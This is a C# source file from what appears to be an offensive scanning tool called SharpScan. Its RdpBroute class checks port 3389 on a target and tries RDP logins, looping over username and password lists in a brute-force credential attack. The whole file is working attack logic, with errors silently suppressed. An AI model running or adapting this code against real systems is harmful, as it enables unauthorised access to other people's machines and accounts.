﻿using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.Win32;
using SharpRDPCheck;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Authentication;
using System.Text;
using System.Threading;

namespace SharpScan
{
    internal class RdpBroute
    {
        public RdpBroute(string IP)
        {
            if (!string.IsNullOrEmpty(Program.userName) && !string.IsNullOrEmpty(Program.passWord))
            {
                try
                {
                    int Port = 3389;
                    if (!Helper.TestPort(IP, Port))
                    {
                        return;
                        // return $"{ip},445,Port unreachable";
                    }

                    if (!string.IsNullOrEmpty(Program.userName) && !string.IsNullOrEmpty(Program.passWord))
                    {
                        Console.WriteLine($"[*] {IP}:{Port}{Helper.GetServiceByPort(Port)} is open");
                        Options.Host = IP;
                        Options.Port = Port;
                        Options.Username = Program.userName;
                        Options.Password = Program.passWord;
                        Network.Connect(Options.Host, Port);
                        MCS.sendConnectionRequest(null, true);
                    }
                    if (Program.userList != null && Program.passwordList != null)
                    {
                        foreach (var user in Program.userList)
                        {
                            foreach (var pass in Program.passwordList)
                            {
                                Console.WriteLine($"[*] {IP}:{Port}{Helper.GetServiceByPort(Port)} is open");
                                Options.Host = IP;
                                Options.Port = Port;
                                Options.Username = user;
                                Options.Password = pass;
                                Network.Connect(Options.Host, Port);
                                MCS.sendConnectionRequest(null, true);
                            }
                        }
                    }
                    


                }
                catch (Exception exception)
                {
                    //Console.WriteLine("[!] " + exception.Message);
                    //Console.WriteLine("InnerException: " + exception.InnerException);
                }
            }


        }
    }
}
